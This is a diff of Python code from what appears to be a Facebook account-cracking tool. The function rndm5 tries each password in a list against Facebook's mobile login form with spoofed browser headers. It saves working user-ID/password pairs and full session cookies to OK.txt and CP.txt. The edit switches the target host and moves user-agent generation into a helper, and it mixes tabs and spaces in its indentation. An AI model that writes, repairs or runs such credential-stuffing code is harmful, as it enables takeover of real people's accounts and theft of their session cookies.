@@ -1394,17 +1394,17 @@ def rndm4(uid,passlist):
 
 
 def rndm5(uid,passlist):
-	global loop
-	global cps
-	global oks
-	sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M4{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
-	session=requests.Session()
-	try:
-		for pasw in passlist:
+        global loop
+        global oks
+        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M4{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        session=requests.Session()
+        au=Ugen()
+        try:
+                for pas in passlist:
 			ses = requests.Session()
 			heas = {"Host": "x.facebook.com",
 				"dnt": "1","upgrade-insecure-requests": "1",
-				"user-agent": str(random.choice([f"Mozilla/5.0 (Linux; Android {str(random.randint(4,9))}; SM-J{str(random.randint(199,599))}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(80,107))}.0.{str(random.randint(1999,4999))}.0 Mobile Safari/537.36"])),
+				"user-agent": au,
 				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
 				"sec-fetch-site": "none",
 				"sec-fetch-mode": "navigate",
@@ -1412,7 +1412,7 @@ def rndm5(uid,passlist):
 				"sec-fetch-dest": "document",
 				"accept-encoding": "gzip, deflate",
 				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
-			link = ses.get("https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=heas)
+			link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=heas)
 			gett = sop(link.text, "html.parser")
 			datax = gett.find("form",{"method":"post"})["action"]
 			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
@@ -1422,40 +1422,40 @@ def rndm5(uid,passlist):
 				"try_number": "0",
 				"unrecognized_tries": "0",
 				"email": uid,
-				"pass": pasw,
+				"pass": pas,
 				"login": "Masuk",
 				"bi_xrwh": "0"}
 			cookie = dict(ses.cookies.get_dict())
-			head = {"Host": " x.facebook.com",
+			head = {"Host": " m.facebook.com",
 				"content-length": "160",
 				"cache-control": "max-age=0",
 				"origin": "https://mbasic.facebook.com",
 				"upgrade-insecure-requests": "1",
 				"dnt": "1",
 				"content-type": "application/x-www-form-urlencoded",
-				"user-agent": str(random.choice([f"Mozilla/5.0 (Linux; Android {str(random.randint(4,9))}; SM-J{str(random.randint(199,599))}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(80,107))}.0.{str(random.randint(1999,4999))}.0 Mobile Safari/537.36"])),
+				"user-agent": au,
 				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
 				"sec-fetch-site": "same-origin",
 				"sec-fetch-mode": "navigate",
 				"sec-fetch-user": "?1",
 				"sec-fetch-dest": "document",
-				"referer": "https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
+				"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
 				"accept-encoding": "gzip, deflate",
 				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			xnxx = ses.post(f"https:// x.facebook.com{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
+			xnxx = ses.post(f"https://m.facebook.com{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
 			fb_cookies=ses.cookies.get_dict().keys()
 			if 'c_user' in fb_cookies:
 				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
 				uidx = coki[65:80]
-				print('\033[1;32m [AZIM-OK] '+uidx+'|'+pasw+'|'+coki+'\033[0;97m')
-				open('OK.txt', 'a').write(uidx+'|'+pasw+'\n')
+				print('\033[1;32m [AZIM-OK] '+uidx+'|'+pas+'|'+coki+'\033[0;97m')
+				open('OK.txt', 'a').write(uidx+'|'+pas+'\n')
 				oks.append(uidx)
 				break
 			elif 'checkpoint' in fb_cookies:
 				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
 				uidx = coki[82:97]
-				print('\033[1;31m [AZIM-CP] '+uidx+' | '+pasw+'\033[0;97m')
-				open('CP.txt', 'a').write(uidx+'|'+pasw+'\n')
+				print('\033[1;31m [AZIM-CP] '+uidx+' | '+pas+'\033[0;97m')
+				open('CP.txt', 'a').write(uidx+'|'+pas+'\n')
 				cps.append(uidx)
 				break
 			else:
